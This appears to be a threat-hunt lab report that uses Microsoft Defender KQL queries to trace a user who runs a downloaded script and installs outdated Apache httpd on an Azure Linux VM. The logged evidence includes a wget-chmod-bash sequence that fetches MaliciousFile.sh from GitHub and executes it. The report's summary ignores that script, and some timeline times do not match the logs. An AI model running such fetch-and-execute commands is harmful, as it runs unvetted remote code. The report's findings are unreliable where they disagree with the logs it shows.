<img width="400" src="https://github.com/user-attachments/assets/cf2bfe69-30da-4a79-aaa4-6d2f0509ecf8"/>

# Threat Hunt Report: Malicious File Execution

## Platforms and Languages Leveraged
- Linux (Ubuntu 22.04) Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Bash

## Scenario

Management has raised concerns about the increasing risk of malicious file execution within the organization. It has been noted that threat actors are leveraging social engineering tactics to trick employees into downloading or executing files that appear legitimate but are in fact malicious. These files, once executed, can initiate unauthorized actions on the network, such as establishing backdoors, escalating privileges, or exfiltrating sensitive data. While no direct incidents have been reported, there is a growing awareness of the potential for an attack, and management has requested a proactive review of systems to identify any evidence of malicious file execution and address potential security gaps.

The objective is to detect and analyze the logs, assess the potential security risks across multiple systems, and ensure that no malicious code is being executed.

## High-Level IoC Discovery Plan

- **Check `DeviceProcessEvents`** for suspicious executions of outdated software or any software associated with known vulnerabilities.
- **Check `DeviceNetworkEvents`** for unusual network activity made by the outdated software or suspicious outbound connections.
- **Check `DeviceFileEvents`** for modifications to software installation files, directories, and configuration files related to outdated software.

---

## Steps Taken

### 1. Searched the `DeviceProcessEvents` Table

Searched for processes running on the network, looking for any machines that were downloading or executing malicious processes. Some suspicious traffic was discovered and the scope of the search was narrowed down to specific device: `DeviceName` **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"** ran by `AccountName` **"baddog"**. 

Further narrowed down the search criteria to the `AccountName` **"baddog"**. 

At **Feb 4, 2025 10:14:39 AM**, the user **"baddog"** executed the following command on the device **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"**:
```
wget https://raw.githubusercontent.com/Goodka7/Threat-Hunting-Malicious-Execution-/refs/heads/main/resources/MaliciousFile.sh
```

This command downloaded a bash script titled "MaliciousFile".

At **Feb 4, 2025 10:15:37 AM**, the user **"baddog"** executed the following command on the device **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"**:
```
chmod +x MaliciousFile.sh
```

This command allows this file to be executable.

At **Feb 4, 2025 10:15:44 AM**, the user **"baddog"** executed the following command on the device **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"**:
```
/bin/bash ./MaliciousFile.sh
```

This command executes the file "MaliciousFile.sh"

**Query used to locate events:**

```kql
DeviceProcessEvents
| where InitiatingProcessFileName in ("wget", "curl", "bash", "python", "perl")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc

DeviceProcessEvents
| where AccountName == "baddog"
| where InitiatingProcessFileName in ("wget", "curl", "bash", "python", "perl")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc

DeviceProcessEvents
| where AccountName == "baddog"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessAccountDomain, InitiatingProcessFileName, ProcessCommandLine
| order by Timestamp desc
```

<img width="1212" alt="image" src="https://github.com/user-attachments/assets/73098074-6caa-4872-8fd6-e93644314017">
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/a377c590-acde-4076-b04b-7062e462c148">

---

### 2. Searched the `DeviceNetworkEvents` Table

Searched for any events where the `DeviceName` was **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"** and `AccountName` was **"baddog"** to detect unauthorized software downloads.

At **Feb 3, 2025 10:07:05 AM**, the user **"baddog"** initiated the command: `wget https://archive.apache.org/dist/httpd/httpd-2.4.39.tar.gz`

This log further confirms that a outdated version of Apache HTTP Server was downloadead onto the device.

**Query used to locate event:**

```kql
DeviceNetworkEvents
| where DeviceName == "thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
| where InitiatingProcessAccountName == "baddog"
| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/145de6e0-1938-4540-8029-9e8903a4fdbc">

---

### 3. Searched the `DeviceFileEvents` Table

Detect the creation or execution of a outdated and/or vulnerable version of software.

At **Feb 3, 2025 10:07:30 AM**, the user **"baddog"** executed the following command on the device **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"**:
```
tar -xzvf httpd-2.4.39.tar.gz
```

This created a file in the path `/home/baddog/httpd-2.4.39/support/apachectl.in`, which shows that the outdated software was installed on the system. 

**Query used to locate events:**

```kql
DeviceFileEvents
| where FileName contains "httpd" or FileName contains "apache" or FileName contains "openssl" or FileName contains "tar" or FileName contains "rpm" or FileName contains "make"
| where ActionType in ("FileModified", "FileCreated")
| where InitiatingProcessAccountName == "baddog"
| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessCommandLine
| order by Timestamp desc
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/d9d15ba4-2780-458d-9e39-004ca06f5e00">

---

### Chronological Event Timeline 

### 1. File Download - Outdated Software Downloaded

- **Time:** `Feb 3, 2025 10:07:30 AM`
- **Event:** The employee "baddog" downloaded an outdated version of Apache HTTP Server (2.4.39) to the system.
- **Action:** File download detected.
- **File Path:** `httpd-2.4.39.tar.gz`

### 2. Process Execution - Extracting the Software Archive

- **Time:** `Feb 3, 2025 10:07:30 AM`
- **Event:** The employee executed the command to extract the downloaded Apache HTTP Server archive.
- **Action:** Process execution detected.
- **Command:** `tar -xzvf httpd-2.4.39.tar.gz`
- **File Path:** `/home/baddog/httpd-2.4.39`

### 3. Process Execution - Configuring and Installing the Software

- **Time:** `Feb 3, 2025 10:10:00 AM`
- **Event:** The employee configured and installed the Apache HTTP Server.
- **Action:** Process execution detected.
- **Command:** `./configure --prefix=/usr/local/apache2 && make && sudo make install`
- **File Path:** `/usr/local/apache2`

### 4. Process Execution - Starting Apache Service

- **Time:** `Feb 3, 2025 10:25:33 AM`
- **Event:** The employee started the Apache HTTP Server service.
- **Action:** Process execution detected.
- **Command:** `sudo systemctl start apache2`
- **File Path:** `/usr/local/apache2/bin/apachectl`

### 5. Process Execution - Verifying Service Status

- **Time:** `Feb 3, 2025 10:26:00 AM`
- **Event:** The employee attempted to verify the status of the Apache service.
- **Action:** Process execution detected.
- **Command:** `sudo systemctl status apache2`
- **File Path:** `/usr/local/apache2/bin/apachectl`

---

## Summary

The user "baddog" on the device "thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net" unknowingly downloaded and installed an outdated version of the Apache HTTP Server (`httpd-2.4.39`), which contains several known vulnerabilities. The employee executed commands to extract and install the software, activating it on the system. Once the outdated version was installed, the Apache service was started.

While the software was (probably) installed without malicious intent, its outdated nature and the associated vulnerabilities pose significant security risks. The use of this outdated version of Apache exposes the system to potential exploits by malicious actors targeting known vulnerabilities in this version.

These actions suggest that the employee inadvertently introduced a security risk by using outdated software, which could be exploited. Immediate action is required to update the software and mitigate any associated risks to the system.

---

## Response Taken

The use of outdated software and the potential vulnerabilities introduced by the employee "baddog" on the endpoint **"thlinux.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"** were confirmed. The device was immediately isolated from the network to prevent further risks. 

I suggest the outdated version of Apache HTTP Server be removed or updated to the latest, secure version. The employee's direct manager was notified, and a recommendation was made to educate the employee on the importance of using up-to-date software and the risks associated with using outdated versions that may have known vulnerabilities.

Further monitoring is being conducted to ensure that no unauthorized access or data exfiltration occurred during the period of exposure.

---
